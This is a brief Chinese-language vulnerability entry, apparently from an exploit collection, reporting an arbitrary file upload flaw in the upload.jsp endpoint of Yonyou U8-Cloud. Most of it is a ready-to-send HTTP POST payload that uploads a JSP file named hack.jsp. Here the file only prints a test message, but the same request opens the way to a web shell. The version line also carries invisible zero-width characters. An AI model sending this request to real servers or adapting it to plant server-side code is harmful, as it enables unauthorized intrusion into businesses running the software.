### 漏洞描述：

用友U8-Cloud upload.jsp接口存在任意文件上传漏洞。

### 影响版本：

用友U8 Cloud‍‍‌‌‌‏‍‎‌‏‌‏‌‎‎‌‏‎‏‌‌‎‌‏‌‏‏‌‌‏‍‎‏‏‌‏‌‍​‎‌‏‎‏‎‍‍‏‎‎‏

### Payload：
```
POST /linux/pages/upload.jsp HTTP/1.1
Host:host
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
filename: hack.jsp
Content-Length: 56

<% out.println("The website has vulnerabilities!!");%>
```
